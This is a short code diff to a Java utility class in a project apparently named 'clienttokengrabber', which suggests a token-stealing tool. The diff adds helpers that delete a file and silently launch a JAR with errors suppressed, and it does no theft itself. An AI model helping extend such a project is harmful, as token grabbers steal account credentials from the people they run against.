@@ -1,4 +1,4 @@
-package main.java.clienttokengrabber.utils;
+package clienttokengrabber.utils;
 
 import java.util.List;
 import java.util.ArrayList;
@@ -31,5 +31,17 @@ public class FileManager {
         }
 
         return validFiles;
+    }
+
+    public static void delete(String filePath) {
+        File file = new File(filePath);
+        if (file.exists()) file.delete();
+    }
+
+    public static void launch(String appPath) {
+        try {
+            ProcessBuilder processBuilder = new ProcessBuilder("java", "-jar", appPath);
+            Process process = processBuilder.start();
+        } catch (Exception ignored) {}
     }
 }
